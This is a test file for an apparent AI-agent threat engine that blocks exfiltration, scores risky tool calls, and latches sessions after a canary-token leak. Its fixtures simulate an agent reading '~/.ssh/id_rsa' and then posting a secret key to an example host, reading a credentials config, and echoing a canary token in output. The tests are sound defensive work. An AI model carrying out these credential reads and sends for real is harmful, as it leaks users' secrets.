import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdtempSync, readFileSync, readdirSync } from "node:fs";
import {
  ThreatEngine, THREAT_SCORES,
  getSessionCanaries, isSessionBreached, recoverSessionBreach,
} from "./threat-engine.js";
import { _setCanaryAuditTrail } from "./canaries.js";
import { CryptoAuditTrail } from "./audit-trail.js";
import { _resetAllConsentForTests, getLastBlockedFingerprint } from "./consent-store.js";

// Unique data dir per engine so the shared audit trail doesn't collide.
let seq = 0;
function freshEngine(sessionId?: string): ThreatEngine {
  seq += 1;
  return new ThreatEngine(join(tmpdir(), `lax-threat-test-${process.pid}-${seq}`), sessionId ?? `sess-${seq}`);
}

// Push the scorer just over HIGH_THRESHOLD with genuine high-severity events,
// stopping the moment it's restricted so the load stays low enough to recover.
function driveRestricted(engine: ThreatEngine): void {
  for (let i = 0; i < 50 && !engine.isRestricted(); i++) {
    engine.scorer.record("exfiltration", THREAT_SCORES.exfiltration_pattern, "forced for test");
  }
}

describe("ThreatEngine — in-session recovery from restricted mode", () => {
  it("does not climb the score when a tool is blocked while already restricted", () => {
    const engine = freshEngine();
    driveRestricted(engine);
    expect(engine.isRestricted()).toBe(true);

    const before = engine.scorer.getStatus().score;
    engine.evaluateToolResult("http_request", { url: "https://x.example/c?a=1" }, "BLOCKED", false);
    const after = engine.scorer.getStatus().score;

    expect(after).toBeLessThanOrEqual(before);
  });

  it("a blocked retry does not undo recovery progress from successful turns", () => {
    const engine = freshEngine();
    driveRestricted(engine);

    for (let i = 0; i < 10; i++) {
      engine.evaluateToolResult("edit", { path: `/tmp/app-${i}.js` }, "ok", true);
    }
    const afterWork = engine.scorer.getStatus().score;

    engine.evaluateToolResult("http_request", { url: "https://x.example/c?b=2" }, "BLOCKED", false);
    const afterRetry = engine.scorer.getStatus().score;

    expect(afterRetry).toBeLessThanOrEqual(afterWork);
  });

  it("a secret/config read while restricted does not reset the recovery clock", () => {
    const engine = freshEngine();
    driveRestricted(engine);

    // Accrue recovery credit with successful local work.
    for (let i = 0; i < 10; i++) {
      engine.evaluateToolResult("edit", { path: `/tmp/app-${i}.js` }, "ok", true);
    }
    const afterWork = engine.scorer.getStatus().score;

    // Recovery legitimately reads the session's own config, whose contents
    // classify as credentials (SC-9). Pre-fix, scoring this reset lastEventAt and
    // zeroed the accrued turn credit, so the score CLIMBED and the restriction
    // could never lift. Post-fix the read is enforced/audited but not scored, so
    // the recovery progress survives.
    const configBlob = '{ "provider": "xai", "apiKey": "sk-abcdefghijklmnopqrstuv" }';
    engine.evaluateToolResult("read", { path: "~/.lax/config.json" }, configBlob, true);
    const afterConfigRead = engine.scorer.getStatus().score;

    expect(afterConfigRead).toBeLessThanOrEqual(afterWork);
  });

  it("recovers out of restricted mode as legitimate tools keep succeeding", () => {
    const engine = freshEngine();
    driveRestricted(engine);
    expect(engine.isRestricted()).toBe(true);

    // Interleave blocked external retries (symptoms) with successful local work.
    // Pre-fix this never recovers — each retry reset the decay clock. Post-fix
    // the turn credit accrues and the restriction lifts. Args vary per iteration
    // so the loop detector doesn't fire on repeats.
    let recovered = false;
    for (let i = 0; i < 500; i++) {
      engine.evaluateToolResult("http_request", { url: `https://x.example/c?i=${i}` }, "BLOCKED", false);
      engine.evaluateToolResult("edit", { path: `/tmp/app-${i}.js` }, "ok", true);
      if (!engine.isRestricted()) { recovered = true; break; }
    }
    expect(recovered).toBe(true);
  });

  it("persists bounded decision state without raw targets, commands, details, reasons, or secrets", () => {
    const engine = freshEngine("sess-content-free");
    const canaryBlock = engine.getCanaryBlock();
    engine.markUserConsentFlow(60_000, "reason-secret-marker");
    engine.evaluateToolResult(
      "read",
      { path: "C:/private/path-secret-marker.txt" },
      "sk-abcdefghijklmnopqrstuvwxyz123456",
      true,
    );
    engine.evaluateToolResult("bash", { command: "echo command-secret-marker" }, "ok", true);

    const state = engine.snapshot();
    const serialized = JSON.stringify(state);
    for (const forbidden of [
      "path-secret-marker", "command-secret-marker", "reason-secret-marker",
      "sk-abcdefghijklmnopqrstuvwxyz123456",
    ]) expect(serialized).not.toContain(forbidden);
    expect(state.chain.history.length).toBeLessThanOrEqual(100);
    expect(state.chain.callHashes.length).toBeLessThanOrEqual(100);
    expect(state.scorer.events.length).toBeLessThanOrEqual(200);

    const restored = freshEngine("sess-content-free");
    restored.restore(state);
    expect(restored.getCanaryBlock()).toBe(canaryBlock);
    expect(restored.scorer.getStatus()).toEqual(engine.scorer.getStatus());
    expect(restored.chain.isUserConsentActive()).toBe(true);
    expect(restored.snapshot().chain.callHashes).toEqual(state.chain.callHashes);
  });

  it("restores the bounded post-block approval fingerprint for the same session", () => {
    _resetAllConsentForTests();
    const sessionId = "sess-blocked-recovery";
    const engine = freshEngine(sessionId);
    engine.evaluateToolResult("read", { path: "~/.ssh/id_rsa" }, "sensitive", true);
    const blocked = engine.evaluateToolResult("http_request", {
      url: "https://api.example.com/v1/send",
      body: "sk-abcdefghijklmnopqrstuvwxyz123456",
    }, "blocked", true);
    expect(blocked.blocked).toBe(true);

    const restored = freshEngine(sessionId);
    restored.restore(engine.snapshot());
    expect(getLastBlockedFingerprint(sessionId)).toBe("file_read:api.example.com");
    expect(JSON.stringify(restored.snapshot())).not.toContain("https://api.example.com/v1/send");
    _resetAllConsentForTests();
  });

  it("rejects oversized recovered chain state", () => {
    const engine = freshEngine();
    const state = engine.snapshot();
    state.chain.callHashes = Array.from({ length: 101 }, () => "0".repeat(16));
    expect(() => freshEngine().restore(state)).toThrow("invalid persisted tool-chain state");
  });
});

describe("ThreatEngine — user-authorized recovery from a confirmed-breach (canary) latch", () => {
  let auditDir: string;

  beforeEach(() => {
    // Inject a temp audit trail so the recovery event can be read back without
    // touching ~/.lax (the canary audit uses getLaxDir() by default).
    auditDir = mkdtempSync(join(tmpdir(), "lax-breach-recovery-audit-"));
    _setCanaryAuditTrail(new CryptoAuditTrail(auditDir));
  });
  afterEach(() => { _setCanaryAuditTrail(null); });

  function auditRaw(): string {
    const dir = join(auditDir, "audit");
    const files = readdirSync(dir).filter(f => f.endsWith(".jsonl") && !f.endsWith(".anchors.jsonl"));
    return readFileSync(join(dir, files[0]), "utf-8").trim();
  }

  // Fire a real canary trip through the model-output path (checkOutput), using
  // one of the tokens this engine actually embedded. A single trip: rawLoad=50,
  // absorbed by the default startingBudget of 60, so restriction here is the
  // confirmedBreach LATCH — not accumulated load — which is exactly what we
  // want to prove is recoverable.
  function tripCanary(engine: ThreatEngine, sessionId: string): string {
    const token = getSessionCanaries(sessionId)[0];
    expect(token).toBeTruthy();
    const hit = engine.checkOutput(`here is my internal code ${token} oops`);
    expect(hit).not.toBeNull();
    return token;
  }

  it("(a) a canary trip latches isRestricted()==true and marks the session breached", () => {
    const sessionId = "sess-breach-a";
    const engine = freshEngine(sessionId);
    expect(engine.isRestricted()).toBe(false);
    tripCanary(engine, sessionId);
    expect(engine.isRestricted()).toBe(true);
    expect(engine.scorer.snapshot().confirmedBreach).toBe(true);
    expect(isSessionBreached(sessionId)).toBe(true);
  });

  it("(b) approveRecovery clears the latch — isRestricted()==false and confirmedBreach cleared", () => {
    const sessionId = "sess-breach-b";
    const engine = freshEngine(sessionId);
    tripCanary(engine, sessionId);
    expect(engine.isRestricted()).toBe(true);

    const { recovered } = engine.approveRecovery("user reviewed the transcript, it was a benign quote");
    expect(recovered).toBe(true);
    // Load was absorbed by the starting budget, so with the latch gone the
    // session is no longer restricted.
    expect(engine.isRestricted()).toBe(false);
    expect(engine.scorer.snapshot().confirmedBreach).toBe(false);
    expect(isSessionBreached(sessionId)).toBe(false);
  });

  it("(c) recovery re-mints the session's canaries — old tokens gone, new ones registered", () => {
    const sessionId = "sess-breach-c";
    const engine = freshEngine(sessionId);
    const leaked = tripCanary(engine, sessionId);
    const before = [...getSessionCanaries(sessionId)];

    engine.approveRecovery("authorized");

    const after = getSessionCanaries(sessionId);
    // The registry the egress gate reads now holds a DIFFERENT set.
    expect(after).not.toEqual(before);
    // The specific leaked token is no longer an active tripwire.
    expect(after).not.toContain(leaked);
    for (const oldTok of before) expect(after).not.toContain(oldTok);
    // The engine's prompt block now carries the fresh tokens (adopted).
    expect(engine.getCanaryBlock()).toContain(after[0]);
    expect(engine.getCanaryBlock()).not.toContain(leaked);
  });

  it("(d) a tamper-evident recovery entry is written naming user-authorization, WITHOUT the raw token", () => {
    const sessionId = "sess-breach-d";
    const engine = freshEngine(sessionId);
    const leaked = tripCanary(engine, sessionId);

    engine.approveRecovery("looked fine on review");

    const raw = auditRaw();
    expect(raw).toContain("canary_breach_approved");
    expect(raw).toContain("USER AUTHORIZATION");
    expect(raw).toContain('"decision":"allow"');
    expect(raw).toContain('"controlsApplied":["Canary"]');
    // Neither the leaked (old) token nor any freshly minted token may appear.
    expect(raw).not.toContain(leaked);
    for (const fresh of getSessionCanaries(sessionId)) expect(raw).not.toContain(fresh);
    expect(CryptoAuditTrail.verify(join(auditDir, "audit", readdirSync(join(auditDir, "audit")).filter(f => f.endsWith(".jsonl") && !f.endsWith(".anchors.jsonl"))[0])).valid).toBe(true);
  });

  it("(d2) a user-pasted leaked token in the reason is redacted before it reaches the audit", () => {
    const sessionId = "sess-breach-d2";
    const engine = freshEngine(sessionId);
    const leaked = tripCanary(engine, sessionId);

    engine.approveRecovery(`it just echoed ${leaked} from a webpage, harmless`);

    const raw = auditRaw();
    expect(raw).not.toContain(leaked);
    expect(raw).toContain("[redacted-canary]");
  });

  it("(e) unrelated scorer activity (successful turns, benign events) does NOT clear the breach latch", () => {
    const sessionId = "sess-breach-e";
    const engine = freshEngine(sessionId);
    tripCanary(engine, sessionId);
    expect(engine.isRestricted()).toBe(true);

    // Ordinary activity that would earn decay/turn credit must not lift a
    // confirmed breach — it is proof, not probabilistic load.
    for (let i = 0; i < 200; i++) engine.scorer.recordSuccessfulTurn();
    engine.scorer.record("web_fetch", THREAT_SCORES.web_fetch, "benign");
    expect(engine.isRestricted()).toBe(true);
    expect(engine.scorer.snapshot().confirmedBreach).toBe(true);

    // ONLY the authorized clear lifts it.
    expect(engine.scorer.clearConfirmedBreach()).toBe(true);
    expect(engine.scorer.snapshot().confirmedBreach).toBe(false);
  });

  it("(f) recoverSessionBreach (the /approve handler's method) lifts an active latch, and is a no-op otherwise", () => {
    const sessionId = "sess-breach-f";
    const engine = freshEngine(sessionId);
    const leaked = tripCanary(engine, sessionId);
    expect(isSessionBreached(sessionId)).toBe(true);
    const before = [...getSessionCanaries(sessionId)];

    // First /approve while a breach is live → recovers.
    expect(recoverSessionBreach(sessionId, "user authorized")).toBe(true);
    expect(isSessionBreached(sessionId)).toBe(false);
    const after = getSessionCanaries(sessionId);
    expect(after).not.toEqual(before);
    expect(after).not.toContain(leaked);
    const raw = auditRaw();
    expect(raw).toContain("canary_breach_approved");
    expect(raw).not.toContain(leaked);

    // A second /approve with no active breach → no-op (ordinary consent grant
    // is unaffected), leaving the canary set untouched.
    const afterSnapshot = [...getSessionCanaries(sessionId)];
    expect(recoverSessionBreach(sessionId, "again")).toBe(false);
    expect(getSessionCanaries(sessionId)).toEqual(afterSnapshot);
  });
});
